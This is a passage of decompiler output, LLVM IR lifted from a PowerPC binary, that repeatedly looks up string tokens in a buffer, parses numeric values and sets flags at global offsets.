  store i32 2, i32* %r0.global-to-local, align 4
  %v1_10000d3c = load i32, i32* @r30, align 4
  %v2_10000d3c = add i32 %v1_10000d3c, 919
  %v3_10000d3c = inttoptr i32 %v2_10000d3c to i32*
  store i32 2, i32* %v3_10000d3c, align 4
  br label %dec_label_pc_10000d40

dec_label_pc_10000d40:                            ; preds = %dec_label_pc_10000cf4, %dec_label_pc_10000d38
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 45, i32* %r3.global-to-local, align 4
  store i32 268438860, i32* %lr.global-to-local, align 4
  %v3_10000d48 = call i32 @function_10006bb0(i32 45, i32* null)
  %v0_10000d4c = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000d4c, i32* %r4.global-to-local, align 4
  %v0_10000d54 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d54, i32* %r3.global-to-local, align 4
  store i32 268438876, i32* %lr.global-to-local, align 4
  %v3_10000d58 = inttoptr i32 %v0_10000d54 to i8*
  %v4_10000d58 = call i32 @function_1000788c(i8* %v3_10000d58, i32 %v0_10000d4c, i32 %v3_10000d48)
  store i32 %v4_10000d58, i32* %r3.global-to-local, align 4
  %v1_10000d5c = icmp slt i32 %v4_10000d58, -1
  %v2_10000d5c = icmp sgt i32 %v4_10000d58, -1
  %v3_10000d5c = icmp eq i32 %v4_10000d58, -1
  store i1 %v1_10000d5c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000d5c, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000d5c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000d5c, label %dec_label_pc_10000d6c, label %dec_label_pc_10000d64

dec_label_pc_10000d64:                            ; preds = %dec_label_pc_10000d40
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10000d68 = load i32, i32* @r30, align 4
  %v2_10000d68 = add i32 %v1_10000d68, 919
  %v3_10000d68 = inttoptr i32 %v2_10000d68 to i32*
  store i32 1, i32* %v3_10000d68, align 4
  br label %dec_label_pc_10000d6c

dec_label_pc_10000d6c:                            ; preds = %dec_label_pc_10000d40, %dec_label_pc_10000d64
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10000d74 = load i32, i32* @r30, align 4
  %v2_10000d74 = add i32 %v1_10000d74, 923
  %v3_10000d74 = inttoptr i32 %v2_10000d74 to i32*
  store i32 0, i32* %v3_10000d74, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 268438912, i32* %lr.global-to-local, align 4
  %v3_10000d7c = call i32 @function_10006bb0(i32 44, i32* null)
  %v0_10000d80 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000d80, i32* %r4.global-to-local, align 4
  %v0_10000d88 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000d88, i32* %r3.global-to-local, align 4
  store i32 268438928, i32* %lr.global-to-local, align 4
  %v3_10000d8c = inttoptr i32 %v0_10000d88 to i8*
  %v4_10000d8c = call i32 @function_1000788c(i8* %v3_10000d8c, i32 %v0_10000d80, i32 %v3_10000d7c)
  store i32 %v4_10000d8c, i32* %r3.global-to-local, align 4
  %v1_10000d90 = icmp slt i32 %v4_10000d8c, -1
  %v2_10000d90 = icmp sgt i32 %v4_10000d8c, -1
  %v3_10000d90 = icmp eq i32 %v4_10000d8c, -1
  store i1 %v1_10000d90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000d90, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000d90, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000d90, label %dec_label_pc_10000e40, label %dec_label_pc_10000d98

dec_label_pc_10000d98:                            ; preds = %dec_label_pc_10000d6c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 268438948, i32* %lr.global-to-local, align 4
  %v3_10000da0 = call i32 @function_10006bb0(i32 44, i32* null)
  %v0_10000da4 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000da4, i32* %r4.global-to-local, align 4
  %v0_10000dac = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000dac, i32* %r3.global-to-local, align 4
  store i32 268438964, i32* %lr.global-to-local, align 4
  %v3_10000db0 = inttoptr i32 %v0_10000dac to i8*
  %v4_10000db0 = call i32 @function_1000788c(i8* %v3_10000db0, i32 %v0_10000da4, i32 %v3_10000da0)
  store i32 %v4_10000db0, i32* %r3.global-to-local, align 4
  %v0_10000db8 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000db8 = add i32 %v0_10000db8, %v4_10000db0
  store i32 %v2_10000db8, i32* %r9.global-to-local, align 4
  %v1_10000dbc = add i32 %v2_10000db8, 10532
  %v2_10000dbc = inttoptr i32 %v1_10000dbc to i8*
  %v3_10000dbc = load i8, i8* %v2_10000dbc, align 1
  %v4_10000dbc = zext i8 %v3_10000dbc to i32
  store i32 %v4_10000dbc, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10000dc8 = xor i32 %v4_10000dbc, 32
  %v1_10000dcc = sub nsw i32 0, %v1_10000dc8
  %v2_10000dcc = xor i32 %v4_10000dbc, -33
  %v4_10000dcc = icmp uge i32 %v2_10000dcc, %v1_10000dcc
  %v2_10000dd0 = zext i1 %v4_10000dcc to i32
  %v3_10000dd0 = add i32 %v2_10000dd0, %v4_10000db0
  store i32 %v3_10000dd0, i32* %r11.global-to-local, align 4
  %v0_10000dd4 = load i32, i32* %r20.global-to-local, align 4
  %v2_10000dd4 = add i32 %v3_10000dd0, %v0_10000dd4
  store i32 %v2_10000dd4, i32* %r28.global-to-local, align 4
  store i32 %v2_10000dd4, i32* %r3.global-to-local, align 4
  %v1_10000ddc = load i32, i32* %r24.global-to-local, align 4
  %v2_10000ddc = sub i32 %v1_10000ddc, %v3_10000dd0
  store i32 %v2_10000ddc, i32* %r4.global-to-local, align 4
  store i32 %v3_10000dd0, i32* %r31.global-to-local, align 4
  store i32 268439016, i32* %lr.global-to-local, align 4
  %v5_10000de4 = call i32 @function_100075a8(i32 %v2_10000dd4, i32 %v2_10000ddc, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32 2)
  store i32 %v5_10000de4, i32* %r3.global-to-local, align 4
  %v1_10000de8 = icmp slt i32 %v5_10000de4, -1
  %v2_10000de8 = icmp sgt i32 %v5_10000de4, -1
  %v3_10000de8 = icmp eq i32 %v5_10000de4, -1
  store i1 %v1_10000de8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000de8, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000de8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000de8, label %dec_label_pc_10000e40, label %dec_label_pc_10000df0

dec_label_pc_10000df0:                            ; preds = %dec_label_pc_10000d98
  %v1_10000df0 = icmp slt i32 %v5_10000de4, 1
  %v2_10000df0 = icmp sgt i32 %v5_10000de4, 1
  %v3_10000df0 = icmp eq i32 %v5_10000de4, 1
  store i1 %v1_10000df0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000df0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000df0, i1* %cr7_eq.global-to-local, align 1
  %tmp74 = icmp slt i32 %v5_10000de4, 2
  br i1 %tmp74, label %dec_label_pc_10000dfc, label %dec_label_pc_10000df8

dec_label_pc_10000df8:                            ; preds = %dec_label_pc_10000df0
  %v1_10000df8 = add i32 %v5_10000de4, -2
  store i32 %v1_10000df8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000dfc

dec_label_pc_10000dfc:                            ; preds = %dec_label_pc_10000df0, %dec_label_pc_10000df8
  %v1_10000e00 = phi i32 [ %v5_10000de4, %dec_label_pc_10000df0 ], [ %v1_10000df8, %dec_label_pc_10000df8 ]
  %v0_10000dfc = load i32, i32* %r18.global-to-local, align 4
  %v1_10000dfc = load i32, i32* %r31.global-to-local, align 4
  %v2_10000dfc = add i32 %v0_10000dfc, %v1_10000e00
  %v2_10000e00 = add i32 %v2_10000dfc, %v1_10000dfc
  store i32 %v2_10000e00, i32* %r9.global-to-local, align 4
  %v0_10000e04 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000e04, i32* %r3.global-to-local, align 4
  %v0_10000e08 = load i32, i32* %r29.global-to-local, align 4
  %v1_10000e08 = trunc i32 %v0_10000e08 to i8
  %v3_10000e08 = add i32 %v2_10000e00, 10532
  %v4_10000e08 = inttoptr i32 %v3_10000e08 to i8*
  store i8 %v1_10000e08, i8* %v4_10000e08, align 1
  store i32 268439056, i32* @lr, align 4
  %v1_10000e0c = inttoptr i32 %v0_10000e04 to i8*
  %v2_10000e0c = call i32 @function_100074dc(i8* %v1_10000e0c)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000e0c, i32* %r29.global-to-local, align 4
  store i32 43, i32* %r3.global-to-local, align 4
  store i32 268439072, i32* %lr.global-to-local, align 4
  %v3_10000e1c = call i32 @function_10006bb0(i32 43, i32* null)
  %v0_10000e20 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000e20, i32* %r4.global-to-local, align 4
  %v0_10000e28 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000e28, i32* %r3.global-to-local, align 4
  store i32 268439088, i32* %lr.global-to-local, align 4
  %v3_10000e2c = inttoptr i32 %v0_10000e28 to i8*
  %v4_10000e2c = call i32 @function_1000788c(i8* %v3_10000e2c, i32 %v0_10000e20, i32 %v3_10000e1c)
  store i32 %v4_10000e2c, i32* %r3.global-to-local, align 4
  %v1_10000e30 = icmp slt i32 %v4_10000e2c, 0
  %v2_10000e30 = icmp sgt i32 %v4_10000e2c, 0
  %v3_10000e30 = icmp eq i32 %v4_10000e2c, 0
  store i1 %v1_10000e30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000e30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000e30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e30, label %dec_label_pc_10000e40, label %dec_label_pc_10000e38

dec_label_pc_10000e38:                            ; preds = %dec_label_pc_10000dfc
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10000e3c = load i32, i32* @r30, align 4
  %v2_10000e3c = add i32 %v1_10000e3c, 923
  %v3_10000e3c = inttoptr i32 %v2_10000e3c to i32*
  store i32 1, i32* %v3_10000e3c, align 4
  br label %dec_label_pc_10000e40

dec_label_pc_10000e40:                            ; preds = %dec_label_pc_10000dfc, %dec_label_pc_10000d98, %dec_label_pc_10000d6c, %dec_label_pc_10000e38
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_10000e48 = load i32, i32* @r30, align 4
  %v2_10000e48 = add i32 %v1_10000e48, 927
  %v3_10000e48 = inttoptr i32 %v2_10000e48 to i32*
  store i32 0, i32* %v3_10000e48, align 4
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 268439124, i32* %lr.global-to-local, align 4
  %v3_10000e50 = call i32 @function_10006bb0(i32 41, i32* null)
  %v0_10000e54 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000e54, i32* %r4.global-to-local, align 4
  %v0_10000e5c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000e5c, i32* %r3.global-to-local, align 4
  store i32 268439140, i32* %lr.global-to-local, align 4
  %v3_10000e60 = inttoptr i32 %v0_10000e5c to i8*
  %v4_10000e60 = call i32 @function_1000788c(i8* %v3_10000e60, i32 %v0_10000e54, i32 %v3_10000e50)
  store i32 %v4_10000e60, i32* %r3.global-to-local, align 4
  %v1_10000e64 = icmp slt i32 %v4_10000e60, -1
  %v2_10000e64 = icmp sgt i32 %v4_10000e60, -1
  %v3_10000e64 = icmp eq i32 %v4_10000e60, -1
  store i1 %v1_10000e64, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000e64, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000e64, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000e64, label %dec_label_pc_10000f14, label %dec_label_pc_10000e6c

dec_label_pc_10000e6c:                            ; preds = %dec_label_pc_10000e40
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 41, i32* %r3.global-to-local, align 4
  store i32 268439160, i32* %lr.global-to-local, align 4
  %v3_10000e74 = call i32 @function_10006bb0(i32 41, i32* null)
  %v0_10000e78 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000e78, i32* %r4.global-to-local, align 4
  %v0_10000e80 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000e80, i32* %r3.global-to-local, align 4
  store i32 268439176, i32* %lr.global-to-local, align 4
  %v3_10000e84 = inttoptr i32 %v0_10000e80 to i8*
  %v4_10000e84 = call i32 @function_1000788c(i8* %v3_10000e84, i32 %v0_10000e78, i32 %v3_10000e74)
  store i32 %v4_10000e84, i32* %r3.global-to-local, align 4
  %v0_10000e8c = load i32, i32* %r18.global-to-local, align 4
  %v2_10000e8c = add i32 %v0_10000e8c, %v4_10000e84
  store i32 %v2_10000e8c, i32* %r9.global-to-local, align 4
  %v1_10000e90 = add i32 %v2_10000e8c, 10532
  %v2_10000e90 = inttoptr i32 %v1_10000e90 to i8*
  %v3_10000e90 = load i8, i8* %v2_10000e90, align 1
  %v4_10000e90 = zext i8 %v3_10000e90 to i32
  store i32 %v4_10000e90, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10000e9c = xor i32 %v4_10000e90, 32
  %v1_10000ea0 = sub nsw i32 0, %v1_10000e9c
  %v2_10000ea0 = xor i32 %v4_10000e90, -33
  %v4_10000ea0 = icmp uge i32 %v2_10000ea0, %v1_10000ea0
  %v2_10000ea4 = zext i1 %v4_10000ea0 to i32
  %v3_10000ea4 = add i32 %v2_10000ea4, %v4_10000e84
  store i32 %v3_10000ea4, i32* %r11.global-to-local, align 4
  %v0_10000ea8 = load i32, i32* %r20.global-to-local, align 4
  %v2_10000ea8 = add i32 %v3_10000ea4, %v0_10000ea8
  store i32 %v2_10000ea8, i32* %r28.global-to-local, align 4
  store i32 %v2_10000ea8, i32* %r3.global-to-local, align 4
  %v1_10000eb0 = load i32, i32* %r24.global-to-local, align 4
  %v2_10000eb0 = sub i32 %v1_10000eb0, %v3_10000ea4
  store i32 %v2_10000eb0, i32* %r4.global-to-local, align 4
  store i32 %v3_10000ea4, i32* %r31.global-to-local, align 4
  store i32 268439228, i32* %lr.global-to-local, align 4
  %v5_10000eb8 = call i32 @function_100075a8(i32 %v2_10000ea8, i32 %v2_10000eb0, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32 2)
  store i32 %v5_10000eb8, i32* %r3.global-to-local, align 4
  %v1_10000ebc = icmp slt i32 %v5_10000eb8, -1
  %v2_10000ebc = icmp sgt i32 %v5_10000eb8, -1
  %v3_10000ebc = icmp eq i32 %v5_10000eb8, -1
  store i1 %v1_10000ebc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000ebc, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000ebc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000ebc, label %dec_label_pc_10000f14, label %dec_label_pc_10000ec4

dec_label_pc_10000ec4:                            ; preds = %dec_label_pc_10000e6c
  %v1_10000ec4 = icmp slt i32 %v5_10000eb8, 1
  %v2_10000ec4 = icmp sgt i32 %v5_10000eb8, 1
  %v3_10000ec4 = icmp eq i32 %v5_10000eb8, 1
  store i1 %v1_10000ec4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000ec4, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000ec4, i1* %cr7_eq.global-to-local, align 1
  %tmp75 = icmp slt i32 %v5_10000eb8, 2
  br i1 %tmp75, label %dec_label_pc_10000ed0, label %dec_label_pc_10000ecc

dec_label_pc_10000ecc:                            ; preds = %dec_label_pc_10000ec4
  %v1_10000ecc = add i32 %v5_10000eb8, -2
  store i32 %v1_10000ecc, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000ed0

dec_label_pc_10000ed0:                            ; preds = %dec_label_pc_10000ec4, %dec_label_pc_10000ecc
  %v1_10000ed4 = phi i32 [ %v5_10000eb8, %dec_label_pc_10000ec4 ], [ %v1_10000ecc, %dec_label_pc_10000ecc ]
  %v0_10000ed0 = load i32, i32* %r18.global-to-local, align 4
  %v1_10000ed0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10000ed0 = add i32 %v0_10000ed0, %v1_10000ed4
  %v2_10000ed4 = add i32 %v2_10000ed0, %v1_10000ed0
  store i32 %v2_10000ed4, i32* %r9.global-to-local, align 4
  %v0_10000ed8 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000ed8, i32* %r3.global-to-local, align 4
  %v0_10000edc = load i32, i32* %r29.global-to-local, align 4
  %v1_10000edc = trunc i32 %v0_10000edc to i8
  %v3_10000edc = add i32 %v2_10000ed4, 10532
  %v4_10000edc = inttoptr i32 %v3_10000edc to i8*
  store i8 %v1_10000edc, i8* %v4_10000edc, align 1
  store i32 268439268, i32* @lr, align 4
  %v1_10000ee0 = inttoptr i32 %v0_10000ed8 to i8*
  %v2_10000ee0 = call i32 @function_100074dc(i8* %v1_10000ee0)
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000ee0, i32* %r29.global-to-local, align 4
  store i32 42, i32* %r3.global-to-local, align 4
  store i32 268439284, i32* %lr.global-to-local, align 4
  %v3_10000ef0 = call i32 @function_10006bb0(i32 42, i32* null)
  %v0_10000ef4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000ef4, i32* %r4.global-to-local, align 4
  %v0_10000efc = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10000efc, i32* %r3.global-to-local, align 4
  store i32 268439300, i32* %lr.global-to-local, align 4
  %v3_10000f00 = inttoptr i32 %v0_10000efc to i8*
  %v4_10000f00 = call i32 @function_1000788c(i8* %v3_10000f00, i32 %v0_10000ef4, i32 %v3_10000ef0)
  store i32 %v4_10000f00, i32* %r3.global-to-local, align 4
  %v1_10000f04 = icmp slt i32 %v4_10000f00, 0
  %v2_10000f04 = icmp sgt i32 %v4_10000f00, 0
  %v3_10000f04 = icmp eq i32 %v4_10000f00, 0
  store i1 %v1_10000f04, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f04, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f04, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000f04, label %dec_label_pc_10000f14, label %dec_label_pc_10000f0c

dec_label_pc_10000f0c:                            ; preds = %dec_label_pc_10000ed0
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_10000f10 = load i32, i32* @r30, align 4
  %v2_10000f10 = add i32 %v1_10000f10, 927
  %v3_10000f10 = inttoptr i32 %v2_10000f10 to i32*
  store i32 1, i32* %v3_10000f10, align 4
  br label %dec_label_pc_10000f14

dec_label_pc_10000f14:                            ; preds = %dec_label_pc_10000ed0, %dec_label_pc_10000e6c, %dec_label_pc_10000e40, %dec_label_pc_10000f0c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268439328, i32* %lr.global-to-local, align 4
  %v3_10000f1c = call i32 @function_10006bb0(i32 40, i32* null)
  %v0_10000f20 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000f20, i32* %r4.global-to-local, align 4
  %v0_10000f28 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000f28, i32* %r3.global-to-local, align 4
  store i32 268439344, i32* %lr.global-to-local, align 4
  %v3_10000f2c = inttoptr i32 %v0_10000f28 to i8*
  %v4_10000f2c = call i32 @function_1000788c(i8* %v3_10000f2c, i32 %v0_10000f20, i32 %v3_10000f1c)
  store i32 %v4_10000f2c, i32* %r3.global-to-local, align 4
  %v1_10000f30 = icmp slt i32 %v4_10000f2c, -1
  %v2_10000f30 = icmp sgt i32 %v4_10000f2c, -1
  %v3_10000f30 = icmp eq i32 %v4_10000f2c, -1
  store i1 %v1_10000f30, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f30, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f30, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000f30, label %dec_label_pc_10001770, label %dec_label_pc_10000f38

dec_label_pc_10000f38:                            ; preds = %dec_label_pc_10000f14
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 40, i32* %r3.global-to-local, align 4
  store i32 268439364, i32* %lr.global-to-local, align 4
  %v3_10000f40 = call i32 @function_10006bb0(i32 40, i32* null)
  %v0_10000f44 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000f44, i32* %r4.global-to-local, align 4
  %v0_10000f4c = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000f4c, i32* %r3.global-to-local, align 4
  store i32 268439380, i32* %lr.global-to-local, align 4
  %v3_10000f50 = inttoptr i32 %v0_10000f4c to i8*
  %v4_10000f50 = call i32 @function_1000788c(i8* %v3_10000f50, i32 %v0_10000f44, i32 %v3_10000f40)
  store i32 %v4_10000f50, i32* %r3.global-to-local, align 4
  %v0_10000f58 = load i32, i32* %r18.global-to-local, align 4
  %v2_10000f58 = add i32 %v0_10000f58, %v4_10000f50
  store i32 %v2_10000f58, i32* %r9.global-to-local, align 4
  %v1_10000f5c = add i32 %v2_10000f58, 10532
  %v2_10000f5c = inttoptr i32 %v1_10000f5c to i8*
  %v3_10000f5c = load i8, i8* %v2_10000f5c, align 1
  %v4_10000f5c = zext i8 %v3_10000f5c to i32
  store i32 %v4_10000f5c, i32* %r0.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v1_10000f68 = xor i32 %v4_10000f5c, 32
  %v1_10000f6c = sub nsw i32 0, %v1_10000f68
  %v2_10000f6c = xor i32 %v4_10000f5c, -33
  %v4_10000f6c = icmp uge i32 %v2_10000f6c, %v1_10000f6c
  %v2_10000f70 = zext i1 %v4_10000f6c to i32
  %v3_10000f70 = add i32 %v2_10000f70, %v4_10000f50
  store i32 %v3_10000f70, i32* %r11.global-to-local, align 4
  %v0_10000f74 = load i32, i32* %r20.global-to-local, align 4
  %v2_10000f74 = add i32 %v3_10000f70, %v0_10000f74
  store i32 %v2_10000f74, i32* %r29.global-to-local, align 4
  store i32 %v2_10000f74, i32* %r3.global-to-local, align 4
  %v1_10000f7c = load i32, i32* %r24.global-to-local, align 4
  %v2_10000f7c = sub i32 %v1_10000f7c, %v3_10000f70
  store i32 %v2_10000f7c, i32* %r4.global-to-local, align 4
  store i32 %v3_10000f70, i32* %r31.global-to-local, align 4
  store i32 268439432, i32* %lr.global-to-local, align 4
  %v5_10000f84 = call i32 @function_100075a8(i32 %v2_10000f74, i32 %v2_10000f7c, i32 ptrtoint ([3 x i8]* @global_var_1000a7ac.24 to i32), i32 2)
  store i32 %v5_10000f84, i32* %r3.global-to-local, align 4
  %v1_10000f88 = icmp slt i32 %v5_10000f84, -1
  %v2_10000f88 = icmp sgt i32 %v5_10000f84, -1
  %v3_10000f88 = icmp eq i32 %v5_10000f84, -1
  store i1 %v1_10000f88, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f88, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f88, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000f88, label %dec_label_pc_10000fbc, label %dec_label_pc_10000f90

dec_label_pc_10000f90:                            ; preds = %dec_label_pc_10000f38
  %v1_10000f90 = icmp slt i32 %v5_10000f84, 1
  %v2_10000f90 = icmp sgt i32 %v5_10000f84, 1
  %v3_10000f90 = icmp eq i32 %v5_10000f84, 1
  store i1 %v1_10000f90, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000f90, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000f90, i1* %cr7_eq.global-to-local, align 1
  %tmp76 = icmp slt i32 %v5_10000f84, 2
  br i1 %tmp76, label %dec_label_pc_10000f9c, label %dec_label_pc_10000f98

dec_label_pc_10000f98:                            ; preds = %dec_label_pc_10000f90
  %v1_10000f98 = add i32 %v5_10000f84, -2
  store i32 %v1_10000f98, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10000f9c

dec_label_pc_10000f9c:                            ; preds = %dec_label_pc_10000f90, %dec_label_pc_10000f98
  %v1_10000fa4 = phi i32 [ %v5_10000f84, %dec_label_pc_10000f90 ], [ %v1_10000f98, %dec_label_pc_10000f98 ]
  %v0_10000f9c = load i32, i32* %r18.global-to-local, align 4
  %v1_10000f9c = load i32, i32* %r31.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_10000f9c = add i32 %v0_10000f9c, %v1_10000fa4
  %v2_10000fa4 = add i32 %v2_10000f9c, %v1_10000f9c
  store i32 %v2_10000fa4, i32* %r9.global-to-local, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  %v3_10000fac = add i32 %v2_10000fa4, 10532
  %v4_10000fac = inttoptr i32 %v3_10000fac to i8*
  store i8 0, i8* %v4_10000fac, align 1
  %v0_10000fb0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10000fb0, i32* @r3, align 4
  store i32 268439480, i32* @lr, align 4
  %v2_10000fb4 = call i32 @function_10007604(i32 %v0_10000fb0, i32 10)
  store i32 %v2_10000fb4, i32* %r3.global-to-local, align 4
  %v1_10000fb8 = load i32, i32* @r30, align 4
  %v2_10000fb8 = add i32 %v1_10000fb8, 931
  %v3_10000fb8 = inttoptr i32 %v2_10000fb8 to i32*
  store i32 %v2_10000fb4, i32* %v3_10000fb8, align 4
  br label %dec_label_pc_10000fbc

dec_label_pc_10000fbc:                            ; preds = %dec_label_pc_10000f38, %dec_label_pc_10001770, %dec_label_pc_10000f9c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 39, i32* %r3.global-to-local, align 4
  %v0_10000fc8 = load i32, i32* %r20.global-to-local, align 4
  store i32 %v0_10000fc8, i32* %r31.global-to-local, align 4
  store i32 268439504, i32* %lr.global-to-local, align 4
  %v3_10000fcc = call i32 @function_10006bb0(i32 39, i32* null)
  %v0_10000fd0 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10000fd0, i32* %r4.global-to-local, align 4
  %v0_10000fd8 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10000fd8, i32* %r3.global-to-local, align 4
  store i32 268439520, i32* %lr.global-to-local, align 4
  %v3_10000fdc = inttoptr i32 %v0_10000fd8 to i8*
  %v4_10000fdc = call i32 @function_1000788c(i8* %v3_10000fdc, i32 %v0_10000fd0, i32 %v3_10000fcc)
  store i32 %v4_10000fdc, i32* %r3.global-to-local, align 4
  %v1_10000fe0 = icmp slt i32 %v4_10000fdc, -1
  %v2_10000fe0 = icmp sgt i32 %v4_10000fdc, -1
  %v3_10000fe0 = icmp eq i32 %v4_10000fdc, -1
  store i1 %v1_10000fe0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000fe0, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000fe0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10000fe0, label %dec_label_pc_1000111c, label %dec_label_pc_10000fe8

dec_label_pc_10000fe8:                            ; preds = %dec_label_pc_10000fbc, %dec_label_pc_100010f4
  %v0_10000fe8 = load i32, i32* @r30, align 4
  %v1_10000fe8 = add i32 %v0_10000fe8, 935
  %v2_10000fe8 = inttoptr i32 %v1_10000fe8 to i32*
  %v3_10000fe8 = load i32, i32* %v2_10000fe8, align 4
  store i32 %v3_10000fe8, i32* %r0.global-to-local, align 4
  %v1_10000fec = icmp slt i32 %v3_10000fe8, 4
  %v2_10000fec = icmp sgt i32 %v3_10000fe8, 4
  %v3_10000fec = icmp eq i32 %v3_10000fe8, 4
  store i1 %v1_10000fec, i1* %cr7_lt.global-to-local, align 1
  store i1 %v2_10000fec, i1* %cr7_gt.global-to-local, align 1
  store i1 %v3_10000fec, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10000fec, label %dec_label_pc_1000111c, label %dec_label_pc_10000ff4

dec_label_pc_10000ff4:                            ; preds = %dec_label_pc_10000fe8
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 39, i32* %r3.global-to-local, align 4
  store i32 268439552, i32* %lr.global-to-local, align 4
  %v3_10000ffc = call i32 @function_10006bb0(i32 39, i32* null)
  %v0_10001000 = load i32, i32* %r24.global-to-local, align 4
  store i32 %v0_10001000, i32* %r4.global-to-local, align 4
  %v0_10001008 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001008, i32* %r3.global-to-local, align 4
  store i32 268439568, i32* %lr.global-to-local, align 4
  %v3_1000100c = inttoptr i32 %v0_10001008 to i8*
  %v4_1000100c = call i32 @function_1000788c(i8* %v3_1000100c, i32 %v0_10001000, i32 %v3_10000ffc)
  store i32 %v4_1000100c, i32* %r3.global-to-local, align 4
  %v0_10001010 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001010 = add i32 %v0_10001010, %v4_1000100c
  store i32 %v2_10001010, i32* %r26.global-to-local, align 4
  %v0_10001014 = load i32, i32* %r18.global-to-local, align 4
  %v2_10001014 = add i32 %v0_10001014, %v2_10001010
  store i32 %v2_10001014, i32* %r9.global-to-local, align 4
  %v1_10001018 = add i32 %v2_10001014, 10532
  %v2_10001018 = inttoptr i32 %v1_10001018 to i8*
  %v3_10001018 = load i8, i8* %v2_10001018, align 1
  %v4_10001018 = zext i8 %v3_10001018 to i32
  store i32 %v4_10001018, i32* %r0.global-to-local, align 4
